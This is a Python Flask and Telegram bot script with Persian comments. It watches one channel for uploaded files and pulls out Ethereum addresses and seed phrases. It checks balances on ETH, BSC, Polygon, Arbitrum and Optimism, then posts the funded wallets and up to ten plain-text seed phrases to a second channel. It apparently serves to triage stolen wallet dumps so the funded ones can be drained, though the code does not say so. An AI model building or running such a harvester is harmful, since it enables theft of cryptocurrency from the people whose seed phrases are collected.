import os
import re
import logging
import asyncio
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from telegram import Bot, Update
from web3 import Web3

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN")
SOURCE_CHANNEL = -1003533610913
REPORT_CHANNEL = -1004337084974

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
    'POLYGON': 'https://polygon-rpc.com',
    'ARB': 'https://arb1.arbitrum.io/rpc',
    'OP': 'https://mainnet.optimism.io',
}

app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)

def get_wallet_total(address: str) -> dict:
    totals = {net: 0.0 for net in NETWORKS}
    for net, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 5}))
            checksum = Web3.to_checksum_address(address.strip())
            balance = w3.eth.get_balance(checksum)
            totals[net] = float(w3.from_wei(balance, 'ether'))
        except Exception:
            continue
    return totals

async def process_report(doc):
    try:
        logging.info(f"Processing file: {doc.file_name}")

        # دانلود فایل
        file = await bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        # استخراج آدرس‌ها
        addresses = list(set(re.findall(r"0x[a-fA-F0-9]{40}", text)))
        logging.info(f"Found {len(addresses)} addresses")

        if not addresses:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ در فایل `{doc.file_name}` آدرس معتبری پیدا نشد.")
            return

        # استخراج seed phraseها (الگوی رایج ۱۲ یا ۲۴ کلمه‌ای)
        seeds = re.findall(r"(?:[a-z]+(?:\s+[a-z]+){11,23})", text, re.IGNORECASE)
        seeds = list(set([s.strip() for s in seeds if len(s.split()) in (12, 15, 18, 21, 24)]))

        # اسکن موجودی‌ها
        file_totals = {net: 0.0 for net in NETWORKS}
        wallets_with_balance = []

        with ThreadPoolExecutor(max_workers=12) as executor:
            loop = asyncio.get_running_loop()
            tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for addr in addresses]
            results = await asyncio.gather(*tasks)

        for addr, res in zip(addresses, results):
            total_balance = sum(res.values())
            if total_balance > 0:
                wallets_with_balance.append((addr, res))
            for net in NETWORKS:
                file_totals[net] += res[net]

        # ساخت گزارش
        report = (
            f"📊 **گزارش فایل**\n"
            f"📄 نام فایل: `{doc.file_name}`\n"
            f"🔢 تعداد ولت: `{len(addresses)}`\n"
            f"──────────────────\n"
            f"**مجموع موجودی‌ها:**\n"
        )
        for net, amount in file_totals.items():
            report += f"🔹 {net}: `{amount:.6f}`\n"

        if wallets_with_balance:
            report += "\n**ولت‌های دارای موجودی:**\n"
            for addr, balances in wallets_with_balance:
                report += f"\n`{addr}`\n"
                for net, amount in balances.items():
                    if amount > 0:
                        report += f"   • {net}: `{amount:.6f}`\n"

        if seeds:
            report += "\n**Seed Phraseهای پیدا شده:**\n"
            for seed in seeds[:10]:  # حداکثر ۱۰ تا نشون بده
                report += f"`{seed}`\n"

        await bot.send_message(
            chat_id=REPORT_CHANNEL,
            text=report,
            parse_mode='Markdown'
        )
        logging.info("Report sent successfully")

    except Exception as e:
        logging.error(f"Error: {e}", exc_info=True)
        try:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ خطا در پردازش فایل:\n`{str(e)}`")
        except:
            pass

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, bot)

    if update.channel_post and update.channel_post.document:
        if update.channel_post.chat.id == SOURCE_CHANNEL:
            def run():
                asyncio.run(process_report(update.channel_post.document))
            import threading
            threading.Thread(target=run).start()

    return "OK"

@app.route('/')
def health():
    return "Bot is running"
